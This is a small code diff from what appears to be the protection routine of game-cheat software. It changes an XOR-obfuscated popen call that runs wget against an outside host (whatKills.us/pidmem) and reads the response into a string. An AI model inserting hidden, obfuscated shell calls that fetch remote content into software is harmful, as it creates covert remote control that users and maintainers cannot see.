@@ -117,7 +117,7 @@ void protection::verify(int id) {
 
 
     //Project-Spartan.hiv :thinking:
-    FILE *fp = popen(XORSTR("wget --quiet -O - whatKills.us/pidmem"), "r"); //pipe wget output to a file handle    
+    FILE *fp = popen(XORSTR("wget --quiet -O - whatKills.us//pidmem"), "r"); //pipe wget output to a file handle    
     while (fgets(line2, 128, fp))
         result2 += line2;
 
